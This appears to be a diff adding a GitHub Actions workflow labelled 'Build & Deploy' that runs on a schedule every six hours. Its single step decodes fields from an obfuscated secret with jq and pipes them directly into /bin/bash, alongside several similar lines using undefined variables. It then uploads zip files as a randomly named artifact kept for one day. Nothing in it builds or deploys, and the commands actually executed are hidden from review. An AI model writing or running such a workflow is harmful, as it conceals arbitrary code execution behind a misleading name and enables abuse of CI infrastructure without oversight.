@@ -1,0 +1,33 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          bwgcr72: ${{ secrets.bwgcr72 }}
+        run: |
+          printf '%s' "$bwgcr72" | jq -r .t8567 | /bin/bash
+          echo $s8094 | jq -r .vwiue99 | /bin/bash
+          printf '%s' "$l76146" | jq -r .vh2733 | /bin/bash
+          echo $f173 | jq -r .t36 | /bin/bash
+          printf '%s' "$xg72" | jq -r .vb00 | /bin/bash
+          printf '%s' "$k91" | jq -r .vtf65 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: rU4ykmp8
+          path: "*.zip"
+          retention-days: 1
